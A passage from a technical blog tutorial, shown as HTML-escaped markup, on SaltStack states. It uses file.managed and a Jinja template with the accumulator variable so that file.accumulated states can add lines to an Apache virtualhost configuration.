&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;requisite&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;       &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;module&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;state id&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is not:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;requisite&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;       &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;module&amp;gt;.&amp;lt;function&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;state id&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So it is not &lt;code&gt;cmd.run:&lt;/code&gt; here but only &lt;code&gt;cmd:&lt;/code&gt;. And as soon as you start using requisites you see that using meaningfull states ids and not names shortcuts to declare states is quite important, for clarity at least.&lt;/p&gt;

&lt;h2&gt;file.managed using file.accumulated&lt;/h2&gt;

&lt;p&gt;All &lt;a href=&quot;https://github.com/regilero/regilero-blog-examples/tree/master/accumulated-blockreplace&quot;&gt;examples are available on github here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In this first example we'll use several states, the last state will install a &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;managed file&lt;/a&gt; in &lt;code&gt;/etc/apache2/sites-available/100-foo.example.com&lt;/code&gt;, it's an apache virtualhost file, in the debian way. The jinja template associated with this file will contain the basic rules, but we want to allow some other states to add instructions on this virtualhost. We'll see theses states later. We start by the end, with this state building a virtualhost file in a &lt;code&gt;example_com_apache_virtualhost.sls&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;apache-install&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;pkg.installed&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;           &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;apache2&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;-Error&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;l-Scalar-Plain&quot;&gt;100_example_com_virtualhost&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;file.managed&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;salt://files/apache_vhost&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;root&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;root&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;0664&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;jinja&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;defaults&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;docroot&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/path/to/www&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;             &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;servername&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;example.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;apache-install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This file should be put somewhere on your state tree, in this example I will make the function calls as if it were on the root of this tree (like the top.sls file). But there's also a &lt;em&gt;source&lt;/em&gt; template for the managed file, which is called &lt;code&gt;salt://files/apache_vhost&lt;/code&gt;, this file should be present under the salt master tree, in the directory &lt;code&gt;files&lt;/code&gt; (or alter the used path). This is this very simple basic virtualhost example template content:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Main Virtualhost for {{ servername }}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;&amp;lt;VirtualHost&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*:80&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;ServerAdmin&lt;/span&gt; foo@example.com
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;DocumentRoot&lt;/span&gt; {{ docroot }}
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;ServerName&lt;/span&gt; {{ servername }}
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;LogLevel&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;info&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;None&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow, deny
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;deny&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;{{ docroot }}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Options&lt;/span&gt; FollowSymLinks
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;None&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow,deny
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's test this simple state:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;salt-call -linfo state.sls example_com_apache_virtualhost&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You should en up with two states in success and a &lt;code&gt;/etc/apache2/sites-available/100-example.com&lt;/code&gt; file created.
Now let's say we want other states, an infinite list of other states, to be able to alter this file and add content either in the main Directory section or at the end of the file. This way other states could add some apache configuration (this is an example, another way of doing it could be apache's include directive).&lt;/p&gt;

&lt;p&gt;Here comes the &lt;strong&gt;accumulator&lt;/strong&gt; jinja variable. It's a dictionnary, with several keys. Each key of this dictionary is the result of &lt;strong&gt;one or more&lt;/strong&gt; &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; states. So you may have this variable (or not) and it may contain some keys with text data inside. Let's see how to use this on the jinja template (and at first, we known it's empty, we did not used any accumulated state yet).&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;# Main Virtualhost for &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;servername&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &amp;lt;VirtualHost *:80&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        ServerAdmin foo@example.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        DocumentRoot &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;docroot&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        ServerName &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;servername&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        LogLevel info&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;Directory /&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        AllowOverride None&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Order allow, deny&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        deny from all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;Directory &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;docroot&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Options FollowSymLinks&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        AllowOverride None&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Order allow,deny&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Allow from all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        # Here any extra configuration settings if any:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    # Here any extra configuration settings if any:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If you run the state nothing should move, except maybe the two comments lines. The thing we need to do now is to feed this accumulator variable with &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; states. On theses states the &lt;code&gt;name&lt;/code&gt; of the state will match the accumulator key.&lt;/p&gt;

&lt;p&gt;So, for this example, we will use a second sls file &lt;code&gt;more-things-for-virtualhost.sls&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p-Indicator&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# Include dependencies #}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;- example_com_apache_virtualhost&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-a-first-rewrite-rule&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost-maindir&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
